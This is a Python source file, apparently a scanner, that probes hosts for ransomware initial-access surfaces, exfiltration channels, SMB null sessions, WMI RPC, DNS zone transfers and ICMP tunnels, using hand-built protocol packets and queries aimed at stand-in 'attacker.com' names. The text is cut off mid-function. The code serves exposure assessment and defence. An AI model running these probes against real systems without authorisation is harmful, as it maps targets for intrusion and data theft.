            'detail': (
                f'host={host} port=3389 '
                f'banner_len={len(banner_3389)} '
                f'note=RDP_service_responding_common_ransomware_initial_access_vector'
            ),
            'host': host,
            'port': 3389,
        })

    # TCP/3391 RDP alt port probe
    banner_3391 = _tcp_banner(host, 3391, probe=rdp_nego, to=timeout)
    if banner_3391 is not None and len(banner_3391) >= 4:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'RDP_ALT_PORT_EXPOSED',
            'detail': (
                f'host={host} port=3391 '
                f'banner_len={len(banner_3391)} '
                f'note=RDP_on_alternate_port_3391_responding'
            ),
            'host': host,
            'port': 3391,
        })

    # OWA login form probe on port 443 and 80
    for owa_port in (443, 80):
        owa_status, owa_body = _http_get_raw(host, owa_port, '/owa/auth/logon.aspx', to=timeout)
        if owa_status == 200 and owa_body:
            lower_body = owa_body.lower()
            if b'logon' in lower_body or b'password' in lower_body or b'owa' in lower_body:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'OWA_EXPOSED',
                    'detail': (
                        f'host={host} port={owa_port} '
                        f'path=/owa/auth/logon.aspx status=200 '
                        f'note=OWA_login_form_returned_common_IAB_phishing_pivot'
                    ),
                    'host': host,
                    'port': owa_port,
                })
                break

    # Fortinet SSL VPN probe
    for fvpn_port in (443, 8443, 10443):
        fvpn_status, fvpn_body = _http_get_raw(host, fvpn_port, '/remote/login', to=timeout)
        if fvpn_status == 200 and fvpn_body:
            lower_body = fvpn_body.lower()
            if b'forticlient' in lower_body or b'fortinet' in lower_body or b'sslvpn' in lower_body or b'remote' in lower_body:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'FORTINET_VPN_LOGIN_EXPOSED',
                    'detail': (
                        f'host={host} port={fvpn_port} '
                        f'path=/remote/login status=200 '
                        f'note=Fortinet_SSL_VPN_login_page_reachable_high_value_IAB_target'
                    ),
                    'host': host,
                    'port': fvpn_port,
                })
                break

    # Pulse Secure / Ivanti VPN probe
    for pvpn_port in (443, 8443):
        pvpn_status, pvpn_body = _http_get_raw(
            host, pvpn_port,
            '/dana-na/auth/url_default/welcome.cgi',
            to=timeout
        )
        if pvpn_status == 200 and pvpn_body:
            findings.append({
                'severity': 'HIGH',
                'title': 'PULSE_VPN_EXPOSED',
                'detail': (
                    f'host={host} port={pvpn_port} '
                    f'path=/dana-na/auth/url_default/welcome.cgi status=200 '
                    f'note=Pulse_Secure_VPN_login_reachable_frequently_exploited_initial_access'
                ),
                'host': host,
                'port': pvpn_port,
            })
            break

    return findings


def check_data_exfiltration_vectors(host, port=443, timeout=5.0):
    """Check for data exfiltration channel surface.

    Probes for DNS-over-HTTPS, HTTP upload endpoints, exposed file staging
    directories, and SSH/SFTP channels that could be abused for exfiltration.

    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import os

    findings = []

    def _http_get_raw(h, p, path, to=5.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            req = (
                f'GET {path} HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n'
            ).encode()
            s.sendall(req)
            resp = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 32768:
                        break
            except socket.timeout:
                pass
            s.close()
            if not resp:
                return None, {}, b''
            header_end = resp.find(b'\r\n\r\n')
            header_part = resp[:header_end] if header_end != -1 else resp
            body = resp[header_end + 4:] if header_end != -1 else b''
            lines = header_part.split(b'\r\n')
            try:
                status = int(lines[0].split(b' ')[1])
            except (IndexError, ValueError):
                return None, {}, b''
            hdrs = {}
            for line in lines[1:]:
                if b':' in line:
                    k, v = line.split(b':', 1)
                    hdrs[k.strip().lower().decode('latin-1')] = v.strip().decode('latin-1')
            return status, hdrs, body
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None, {}, b''

    def _http_post_raw(h, p, path, data, content_type='application/octet-stream', to=5.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            req = (
                f'POST {path} HTTP/1.1\r\n'
                f'Host: {h}\r\n'
                f'Content-Type: {content_type}\r\n'
                f'Content-Length: {len(data)}\r\n'
                f'Connection: close\r\n'
                f'\r\n'
            ).encode() + data
            s.sendall(req)
            resp = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 16384:
                        break
            except socket.timeout:
                pass
            s.close()
            if not resp:
                return None
            try:
                return int(resp.split(b' ')[1])
            except (IndexError, ValueError):
                return None
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None

    def _tcp_banner(h, p, to=5.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            banner = b''
            try:
                chunk = s.recv(512)
                if chunk:
                    banner = chunk
            except socket.timeout:
                pass
            s.close()
            return banner
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None

    # DNS-over-HTTPS exfil channel probe
    doh_status, doh_hdrs, doh_body = _http_get_raw(
        host, port,
        '/dns-query?name=test.attacker.com&type=A',
        to=timeout
    )
    if doh_status == 200 and doh_body:
        ct = doh_hdrs.get('content-type', '')
        if 'json' in ct or 'dns-message' in ct or doh_body.lstrip()[:1] in (b'{', b'['):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'DOH_EXFIL_CHANNEL_POSSIBLE',
                'detail': (
                    f'host={host} port={port} '
                    f'path=/dns-query status=200 content_type={ct!r} '
                    f'note=DNS_over_HTTPS_endpoint_reachable_covert_exfil_channel'
                ),
                'host': host,
                'port': port,
            })

    # HTTP upload endpoint probe — 1 KB random payload
    upload_payload = os.urandom(1024)
    upload_status = _http_post_raw(host, port, '/api/upload', upload_payload, to=timeout)
    if upload_status is not None and upload_status not in (403, 404, 405, 413, 415):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'HTTP_UPLOAD_ENDPOINT_PRESENT',
            'detail': (
                f'host={host} port={port} '
                f'path=/api/upload method=POST payload_bytes=1024 '
                f'response_status={upload_status} '
                f'note=upload_endpoint_accepted_arbitrary_data'
            ),
            'host': host,
            'port': port,
        })

    # File staging directory exposure
    staging_paths = ['/files/', '/uploads/', '/tmp/']
    for spath in staging_paths:
        for fport in (80, 443, port):
            s_status, s_hdrs, s_body = _http_get_raw(host, fport, spath, to=timeout)
            if s_status == 200 and s_body:
                lower = s_body.lower()
                if b'index of' in lower or b'<a href' in lower:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'FILE_STAGING_DIRECTORY_EXPOSED',
                        'detail': (
                            f'host={host} port={fport} '
                            f'path={spath} status=200 '
                            f'note=directory_listing_enabled_file_staging_exfil_vector'
                        ),
                        'host': host,
                        'port': fport,
                    })
                    break

    # SSH/SFTP exfil channel: TCP/22 banner + PasswordAuthentication check
    ssh_banner = _tcp_banner(host, 22, to=timeout)
    if ssh_banner and b'SSH' in ssh_banner:
        banner_str = ssh_banner.decode('latin-1', errors='replace').strip()
        # If OpenSSH is present and banner doesn't indicate forced pubkey-only
        if b'OpenSSH' in ssh_banner:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SSH_SFTP_EXFIL_CHANNEL',
                'detail': (
                    f'host={host} port=22 '
                    f'banner={banner_str!r} '
                    f'note=OpenSSH_reachable_SFTP_SCP_viable_exfil_channel_if_creds_obtained'
                ),
                'host': host,
                'port': 22,
            })

    return findings


def check_ransomware_precursor_indicators(host, port=445, timeout=5.0):
    """Check for pre-ransomware stage indicators.

    Probes admin share accessibility, exposed database ports, WMI/RPC
    availability for shadow copy deletion, and NetBIOS name disclosure.

    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import struct

    findings = []

    def _tcp_banner(h, p, probe=None, to=5.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            if probe:
                s.sendall(probe)
            banner = b''
            try:
                while len(banner) < 256:
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    banner += chunk
            except socket.timeout:
                pass
            s.close()
            return banner
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None

    # SMB NULL session admin share enumeration
    # NetBIOS Session Request → SMB Negotiate → SMB SessionSetup (null) → TreeConnect ADMIN$
    smb_negotiate = (
        b'\x00\x00\x00\x54'                    # NetBIOS: type=session, length=84
        b'\xff\x53\x4d\x42'                    # SMB magic
        b'\x72'                                 # Command: Negotiate
        b'\x00\x00\x00\x00'                    # NT Status
        b'\x18'                                 # Flags: case insensitive + canonicalized
        b'\x01\x28'                             # Flags2
        b'\x00\x00'                             # PID high
        b'\x00\x00\x00\x00\x00\x00\x00\x00'   # Signature
        b'\x00\x00'                             # Reserved
        b'\xff\xff'                             # TID
        b'\xfe\xff'                             # PID
        b'\x00\x00'                             # UID
        b'\x40\x00'                             # MID
        b'\x00'                                 # WordCount=0
        b'\x31\x00'                             # ByteCount=49
        b'\x02NT LM 0.12\x00'                  # Dialect: NT LM 0.12
        b'\x02SMB 2.002\x00'                   # Dialect: SMB 2.002
        b'\x02SMB 2.???\x00'                   # Dialect: SMB 2.???
    )

    smb_resp = _tcp_banner(host, 445, probe=smb_negotiate, to=timeout)
    if smb_resp and len(smb_resp) >= 4:
        # Any valid SMB response indicates the service is up; attempt null session
        null_sess = (
            b'\xff\x53\x4d\x42'                # SMB magic
            b'\x73'                             # SessionSetupAndX
            b'\x00\x00\x00\x00'                # NT Status
            b'\x18'                             # Flags
            b'\x01\x28'                         # Flags2
            b'\x00\x00'                         # PID high
            b'\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x00'                         # Reserved
            b'\x00\x00'                         # TID
            b'\xff\xfe'                         # PID
            b'\x00\x00'                         # UID
            b'\x41\x00'                         # MID
            b'\x0d'                             # WordCount=13
            b'\xff\x00\x00\x00'                # AndX
            b'\x04\x11'                         # MaxBufferSize
            b'\x02\x00'                         # MaxMpxCount
            b'\x64\x00'                         # VcNumber
            b'\x00\x00\x00\x00'                # SessionKey
            b'\x00\x00'                         # LMResponseLength=0
            b'\x00\x00'                         # NTResponseLength=0
            b'\x00\x00\x00\x00'                # Reserved
            b'\x40\x00\x00\x00'                # Capabilities
            b'\x26\x00'                         # ByteCount=38
            b'\x00' * 26                        # null credentials
        )
        nb_null = struct.pack('>I', len(null_sess)) + null_sess
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, 445))
            s.sendall(smb_negotiate)
            # consume negotiate response
            _ = b''
            try:
                while len(_) < 100:
                    c = s.recv(256)
                    if not c:
                        break
                    _ += c
            except socket.timeout:
                pass
            s.sendall(null_sess)
            null_resp = b''
            try:
                while len(null_resp) < 36:
                    c = s.recv(512)
                    if not c:
                        break
                    null_resp += c
            except socket.timeout:
                pass
            s.close()
            if len(null_resp) >= 13:
                null_status = struct.unpack('<I', null_resp[9:13])[0]
                if null_status == 0x00000000:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'ADMIN_SHARES_ACCESSIBLE',
                        'detail': (
                            f'host={host} port=445 '
                            f'nt_status=0x{null_status:08x} '
                            f'null_session=accepted '
                            f'note=unauthenticated_SMB_null_session_admin_share_enum_possible'
                        ),
                        'host': host,
                        'port': 445,
                    })
        except (ConnectionRefusedError, OSError, socket.timeout):
            pass

    # Exposed database ports — backup/persistence targets for ransomware
    db_ports = {
        1433: 'MSSQL',
        5432: 'PostgreSQL',
        1521: 'Oracle',
        3306: 'MySQL',
        27017: 'MongoDB',
    }
    for db_port, db_label in db_ports.items():
        banner = _tcp_banner(host, db_port, to=timeout)
        if banner is not None:
            banner_excerpt = banner[:64].decode('latin-1', errors='replace').replace('\n', ' ').replace('\r', '')
            findings.append({
                'severity': 'MEDIUM',
                'title': 'DATABASE_PORT_EXPOSED',
                'detail': (
                    f'host={host} port={db_port} '
                    f'service={db_label} '
                    f'banner={banner_excerpt!r} '
                    f'note=database_port_responding_backup_destruction_target'
                ),
                'host': host,
                'port': db_port,
            })

    # WMI/RPC DCE-RPC endpoint mapper (TCP/135) — BIND for IWbemServices
    # Minimal DCE-RPC BIND: version 5.0, OBJUUID = IWbemServices (6BFFD098-A112-...)
    dcerpc_bind = (
        b'\x05\x00'         # version major/minor
        b'\x0b'             # PDU type = BIND
        b'\x03'             # PFC flags
        b'\x10\x00\x00\x00' # data representation (little-endian)
        b'\x48\x00'         # frag length = 72
        b'\x00\x00'         # auth length
        b'\x01\x00\x00\x00' # call ID
        b'\xb8\x10'         # max recv frag
        b'\xb8\x10'         # max send frag
        b'\x00\x00\x00\x00' # assoc group
        b'\x01\x00\x00\x00' # num ctx items = 1
        b'\x00\x00'         # ctx item: context ID
        b'\x01\x00'         # num transfer syntaxes
        # IWbemServices interface UUID: 6BFFD098-A112-3610-9833-46C3F87E345A v0.0
        b'\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a'
        b'\x00\x00\x00\x00'  # version 0.0
        # NDR transfer syntax: 8a885d04-1ceb-11c9-9fe8-08002b104860 v2.0
        b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'
        b'\x02\x00\x00\x00'  # version 2.0
    )
    rpc_banner = _tcp_banner(host, 135, probe=dcerpc_bind, to=timeout)
    if rpc_banner and len(rpc_banner) >= 10:
        # BIND_ACK PDU type = 0x0c
        pdu_type = rpc_banner[2] if len(rpc_banner) > 2 else 0
        if pdu_type == 0x0c:
            findings.append({
                'severity': 'HIGH',
                'title': 'WMI_RPC_ACCESSIBLE',
                'detail': (
                    f'host={host} port=135 '
                    f'pdu_type=BIND_ACK '
                    f'note=DCE_RPC_endpoint_mapper_responds_WMI_available_'
                    f'shadow_copy_deletion_via_WMI_possible'
                ),
                'host': host,
                'port': 135,
            })

    # NetBIOS name service UDP/137 STATUS query
    # NB_STATUS request: transaction ID, flags=0x0010 (query + status), QTYPE=NB_STATUS
    nb_status_req = (
        b'\xab\xcd'         # Transaction ID
        b'\x00\x00'         # Flags: query, non-recursive
        b'\x00\x01'         # QDCOUNT = 1
        b'\x00\x00'         # ANCOUNT
        b'\x00\x00'         # NSCOUNT
        b'\x00\x00'         # ARCOUNT
        b'\x20'             # Name length = 32
        b'CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  # encoded wildcard *
        b'\x00'             # Name terminator
        b'\x00\x21'         # QTYPE = NBSTAT
        b'\x00\x01'         # QCLASS = IN
    )
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.settimeout(timeout)
        udp_sock.sendto(nb_status_req, (host, 137))
        nb_resp, _ = udp_sock.recvfrom(1024)
        udp_sock.close()
        if nb_resp and len(nb_resp) > 56:
            # Parse number of names from byte 56
            num_names = nb_resp[56] if len(nb_resp) > 56 else 0
            # Extract first name (15 chars + 1 suffix byte at offset 57)
            hostname = ''
            if num_names > 0 and len(nb_resp) >= 72:
                raw_name = nb_resp[57:72]
                hostname = raw_name.rstrip(b'\x20\x00').decode('latin-1', errors='replace')
            findings.append({
                'severity': 'MEDIUM',
                'title': 'NETBIOS_NAME_DISCLOSURE',
                'detail': (
                    f'host={host} port=137/udp '
                    f'hostname={hostname!r} num_names={num_names} '
                    f'note=NetBIOS_name_service_discloses_hostname_and_domain_membership'
                ),
                'host': host,
                'port': 137,
            })
    except (OSError, socket.timeout):
        pass

    return findings


def detect_smtp_exfil_surface(host, port=25, timeout=5.0) -> list:
    """Detect SMTP exfiltration channels: open relay, advertised AUTH, STARTTLS without auth."""
    import struct

    findings = []

    def _smtp_probe(h, p, to=5.0):
        """Connect, read banner, return (sock, banner) or (None, '')."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            banner = s.recv(512).decode('latin-1', errors='replace')
            return s, banner
        except (OSError, socket.timeout):
            return None, ''

    def _smtp_cmd(s, cmd, to=5.0):
        """Send a command, read multi-line response, return raw string."""
        try:
            s.settimeout(to)
            s.sendall((cmd + '\r\n').encode())
            buf = b''
            while True:
                chunk = s.recv(512)
                if not chunk:
                    break
                buf += chunk
                lines = buf.decode('latin-1', errors='replace').splitlines()
                # Multi-line responses end when a line matches NNN<space>...
                last = lines[-1] if lines else ''
                if len(last) >= 4 and last[3] == ' ' and last[:3].isdigit():
                    break
                if len(buf) > 4096:
                    break
            return buf.decode('latin-1', errors='replace')
        except (OSError, socket.timeout):
            return ''

    # --- Port 25: EHLO probe for AUTH advertisement and open relay ---
    s, banner = _smtp_probe(host, port, timeout)
    if s:
        ehlo_resp = _smtp_cmd(s, 'EHLO attacker', timeout)
        if '250' in ehlo_resp:
            if 'AUTH' in ehlo_resp.upper():
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SMTP_AUTH_ADVERTISED',
                    'detail': (
                        f'host={host} port={port} '
                        f'note=SMTP_AUTH_advertised_on_EHLO_credential_exfil_via_email_possible '
                        f'ehlo_excerpt={ehlo_resp[:200]!r}'
                    ),
                    'host': host,
                    'port': port,
                })
            # Try unauthenticated MAIL FROM to check open relay
            mail_resp = _smtp_cmd(s, 'MAIL FROM: <test@test.com>', timeout)
            if mail_resp.startswith('250'):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SMTP_OPEN_RELAY',
                    'detail': (
                        f'host={host} port={port} '
                        f'note=unauthenticated_MAIL_FROM_accepted_open_relay_exfil_possible '
                        f'response={mail_resp[:120]!r}'
                    ),
                    'host': host,
                    'port': port,
                })
        try:
            s.close()
        except OSError:
            pass

    # --- Port 587: STARTTLS without auth ---
    s587, banner587 = _smtp_probe(host, 587, timeout)
    if s587:
        ehlo587 = _smtp_cmd(s587, 'EHLO attacker', timeout)
        if '250' in ehlo587 and 'STARTTLS' in ehlo587.upper():
            starttls_resp = _smtp_cmd(s587, 'STARTTLS', timeout)
            if starttls_resp.startswith('220'):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SMTP_STARTTLS_UNAUTHENTICATED',
                    'detail': (
                        f'host={host} port=587 '
                        f'note=STARTTLS_upgrade_accepted_without_authentication '
                        f'response={starttls_resp[:120]!r}'
                    ),
                    'host': host,
                    'port': 587,
                })
        try:
            s587.close()
        except OSError:
            pass

    # --- Port 465: SMTPS banner grab ---
    s465, banner465 = _smtp_probe(host, 465, timeout)
    if s465:
        if banner465:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SMTPS_ACCESSIBLE',
                'detail': (
                    f'host={host} port=465 '
                    f'note=SMTPS_TLS_wrapped_SMTP_accessible_exfil_channel '
                    f'banner={banner465[:120]!r}'
                ),
                'host': host,
                'port': 465,
            })
        try:
            s465.close()
        except OSError:
            pass

    return findings


def detect_dns_exfil_surface(host, port=53, timeout=3.0) -> list:
    """Detect DNS exfiltration channels: TXT queries, TCP/53, zone transfer, mDNS."""
    import struct

    findings = []

    def _build_dns_query(qname_str, qtype=0x0010):
        """Build a minimal DNS query packet."""
        # Header: ID=0x1234, flags=0x0100 (standard query RD=1),
        # QDCOUNT=1, AN=0, NS=0, AR=0
        header = struct.pack('>HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
        # Encode QNAME
        qname_bytes = b''
        for label in qname_str.rstrip('.').split('.'):
            encoded = label.encode('ascii', errors='replace')
            qname_bytes += bytes([len(encoded)]) + encoded
        qname_bytes += b'\x00'
        # QTYPE + QCLASS (IN=1)
        question = qname_bytes + struct.pack('>HH', qtype, 0x0001)
        return header + question

    def _build_dns_tcp(payload):
        """Wrap DNS payload with 2-byte length prefix for TCP."""
        return struct.pack('>H', len(payload)) + payload

    txt_query = _build_dns_query('test.attacker.com', 0x0010)  # TXT
    axfr_query = _build_dns_query('attacker.com', 0x00FC)       # AXFR
    mdns_query = _build_dns_query('_services._dns-sd._udp.local', 0x000C)  # PTR

    # --- UDP/53: TXT record query ---
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.settimeout(timeout)
        udp_sock.sendto(txt_query, (host, 53))
        resp, _ = udp_sock.recvfrom(512)
        udp_sock.close()
        if resp and len(resp) >= 12:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'DNS_TXT_QUERY_SUCCEEDS',
                'detail': (
                    f'host={host} port=53/udp '
                    f'note=DNS_TXT_record_queries_answered_exfil_via_TXT_encoding_possible '
                    f'resp_len={len(resp)}'
                ),
                'host': host,
                'port': 53,
            })
    except (OSError, socket.timeout):
        pass

    # --- TCP/53: same TXT query over TCP ---
    try:
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_sock.settimeout(timeout)
        tcp_sock.connect((host, 53))
        tcp_sock.sendall(_build_dns_tcp(txt_query))
        tcp_resp = tcp_sock.recv(512)
        tcp_sock.close()
        if tcp_resp and len(tcp_resp) >= 4:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'DNS_TCP_ACCESSIBLE',
                'detail': (
                    f'host={host} port=53/tcp '
                    f'note=DNS_over_TCP_accessible_larger_exfil_chunks_possible '
                    f'resp_len={len(tcp_resp)}'
                ),
                'host': host,
                'port': 53,
            })
    except (OSError, socket.timeout):
        pass

    # --- AXFR zone transfer: TCP/53 ---
    try:
        axfr_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        axfr_sock.settimeout(timeout)
        axfr_sock.connect((host, 53))
        axfr_sock.sendall(_build_dns_tcp(axfr_query))
        axfr_resp = axfr_sock.recv(2048)
        axfr_sock.close()
        # AXFR success: response with ANCOUNT > 0 (bytes 6-7 in DNS header, offset 2 in TCP payload)
        if axfr_resp and len(axfr_resp) >= 14:
            # TCP DNS: first 2 bytes = length, then DNS header
            dns_start = 2
            ancount = struct.unpack('>H', axfr_resp[dns_start + 6: dns_start + 8])[0]
            if ancount > 0:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'DNS_ZONE_TRANSFER_ALLOWED',
                    'detail': (
                        f'host={host} port=53/tcp '
                        f'note=AXFR_zone_transfer_accepted_full_zone_data_leaked '
                        f'ancount={ancount} resp_len={len(axfr_resp)}'
                    ),
                    'host': host,
                    'port': 53,
                })
    except (OSError, socket.timeout):
        pass

    # --- UDP/5353: mDNS ---
    try:
        mdns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mdns_sock.settimeout(timeout)
        mdns_sock.sendto(mdns_query, (host, 5353))
        mdns_resp, _ = mdns_sock.recvfrom(512)
        mdns_sock.close()
        if mdns_resp and len(mdns_resp) >= 12:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'MDNS_ACCESSIBLE',
                'detail': (
                    f'host={host} port=5353/udp '
                    f'note=mDNS_responds_local_network_exfil_channel_possible '
                    f'resp_len={len(mdns_resp)}'
                ),
                'host': host,
                'port': 5353,
            })
    except (OSError, socket.timeout):
        pass

    return findings


def detect_icmp_exfil_surface(host, timeout=3.0) -> list:
    """Detect ICMP covert channel surface: echo response, payload modification, large payload."""
    import struct
    import os

    findings = []

    def _icmp_checksum(data):
        """Compute ICMP checksum."""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += (s >> 16)
        return ~s & 0xFFFF

    def _build_icmp_echo(payload=b'PING', seq=1):
        """Build ICMP echo request type=8, code=0, id=0x1337."""
        icmp_id = 0x1337
        # Header with checksum=0 first
        header = struct.pack('>BBHHH', 8, 0, 0, icmp_id, seq)
        chk = _icmp_checksum(header + payload)
        header = struct.pack('>BBHHH', 8, 0, chk, icmp_id, seq)
        return header + payload

    def _send_icmp(h, payload, to=3.0):
        """Send ICMP echo request, return raw response bytes or None."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(to)
            pkt = _build_icmp_echo(payload)
            sock.sendto(pkt, (h, 0))
            resp = sock.recv(1500)
            sock.close()
            return resp
        except (OSError, socket.timeout, PermissionError):
            return None

    # --- Standard ICMP echo (20-byte total: IP header=20 bytes not always present in raw recv) ---
    small_payload = b'PING'
    resp = _send_icmp(host, small_payload, timeout)
    if resp is not None:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ICMP_RESPONDS',
            'detail': (
                f'host={host} proto=icmp '
                f'note=ICMP_echo_response_received_ICMP_tunnel_exfil_possible '
                f'resp_len={len(resp)}'
            ),
            'host': host,
            'port': 0,
        })

        # Check if the server modifies the payload (covert channel indicator)
        # ICMP echo reply is type=0; data starts at IP header (20 bytes) + ICMP header (8 bytes) = offset 28
        if len(resp) >= 28:
            echo_data = resp[28: 28 + len(small_payload)]
            if echo_data != small_payload:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ICMP_PAYLOAD_MODIFIED',
                    'detail': (
                        f'host={host} proto=icmp '
                        f'note=server_modified_ICMP_payload_possible_covert_channel '
                        f'sent={small_payload!r} received={echo_data!r}'
                    ),
                    'host': host,
                    'port': 0,
                })

    # --- Large ICMP payload (1400 bytes) ---
    large_payload = b'A' * 1400
    resp_large = _send_icmp(host, large_payload, timeout)
    if resp_large is not None:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ICMP_LARGE_PAYLOAD_ACCEPTED',
            'detail': (
                f'host={host} proto=icmp '
                f'note=1400_byte_ICMP_payload_echo_accepted_high_bandwidth_exfil_possible '
                f'resp_len={len(resp_large)}'
            ),
            'host': host,
            'port': 0,
        })

    return findings


def detect_cloud_storage_exfil_paths(host, port=443, timeout=5.0) -> list:
    """Detect cloud storage and 3rd-party exfiltration endpoints: Swift, MinIO, GitLab, Gitea."""
    import struct

    findings = []

    def _http_get(h, p, path, tls=False, to=5.0):
        """Raw HTTP/1.1 GET, returns (status_code, body_excerpt) or (None, '')."""
        request = (
            f'GET {path} HTTP/1.1\r\n'
            f'Host: {h}\r\n'
            f'User-Agent: Mozilla/5.0\r\n'
            f'Accept: application/json,*/*\r\n'
            f'Connection: close\r\n\r\n'
        ).encode()
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(to)
            raw_sock.connect((h, p))
            if tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(raw_sock, server_hostname=h)
            else:
                sock = raw_sock
            sock.sendall(request)
            buf = b''
            while len(buf) < 8192:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                buf += chunk
            try:
                sock.close()
            except OSError:
                pass
            text = buf.decode('latin-1', errors='replace')
            # Extract status code from first line
            first_line = text.split('\r\n', 1)[0] if text else ''
            parts = first_line.split(' ', 2)
            code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else None
            body = text[text.find('\r\n\r\n') + 4:] if '\r\n\r\n' in text else ''
            return code, body[:1024]
        except (OSError, socket.timeout, Exception):
            return None, ''

    use_tls = (port == 443)

    # --- OpenStack Swift: GET /v1/ ---
    code, body = _http_get(host, port, '/v1/', tls=use_tls, to=timeout)
    if code in (200, 401, 403):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'OPENSTACK_SWIFT_ENDPOINT',
            'detail': (
                f'host={host} port={port} path=/v1/ status={code} '
                f'note=OpenStack_Swift_object_storage_endpoint_cloud_exfil_path '
                f'body_excerpt={body[:120]!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- MinIO: GET /minio/health/live ---
    code, body = _http_get(host, port, '/minio/health/live', tls=use_tls, to=timeout)
    if code == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'MINIO_ACCESSIBLE',
            'detail': (
                f'host={host} port={port} path=/minio/health/live status={code} '
                f'note=MinIO_S3_compatible_object_store_accessible_data_exfil_via_bucket_upload '
                f'body_excerpt={body[:120]!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- GitLab API: GET /api/v4/projects ---
    code, body = _http_get(host, port, '/api/v4/projects', tls=use_tls, to=timeout)
    if code == 200 and (body.lstrip().startswith('[') or '"id"' in body):
        findings.append({
            'severity': 'HIGH',
            'title': 'GITLAB_API_ACCESSIBLE',
            'detail': (
                f'host={host} port={port} path=/api/v4/projects status={code} '
                f'note=GitLab_API_accessible_unauthenticated_code_exfil_via_git_push '
                f'body_excerpt={body[:120]!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- Gitea API: GET /api/v1/repos ---
    code, body = _http_get(host, port, '/api/v1/repos/search', tls=use_tls, to=timeout)
    if code == 200 and ('"ok"' in body or '"data"' in body or '"repos"' in body):
        findings.append({
            'severity': 'HIGH',
            'title': 'GITEA_ACCESSIBLE',
            'detail': (
                f'host={host} port={port} path=/api/v1/repos/search status={code} '
                f'note=Gitea_private_git_server_accessible_code_exfil_channel '
                f'body_excerpt={body[:120]!r}'
            ),
            'host': host,
            'port': port,
        })

    return findings



# ---------------------------------------------------------------------------
# Violent Python — Chapter 2/5/6 synthesis: SSH botnet, FTP compromise,
# network traffic anomalies, web recon footprint detection
# ---------------------------------------------------------------------------

def detect_ssh_botnet_indicators(host: str, port: int = 22, timeout: float = 5.0) -> list:
    """SSH botnet and brute-force attack surface indicators.

    Synthesized from Violent Python Ch.2 (SSH botnet construction, banner-grab
    for version targeting) and Black Hat Python Ch.2 (pure-socket banner pulls).
    Local sshd_config checks surface pivot-enabling misconfigurations.
    """
    findings = []

    # --- Remote: TCP/22 banner grab ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        banner = sock.recv(1024).decode('utf-8', errors='replace').strip()
        sock.close()

        weak_versions = ('OpenSSH_5', 'OpenSSH_6', 'dropbear_0.', 'dropbear_201',
                         'dropbear_2012', 'dropbear_2013', 'dropbear_2014')
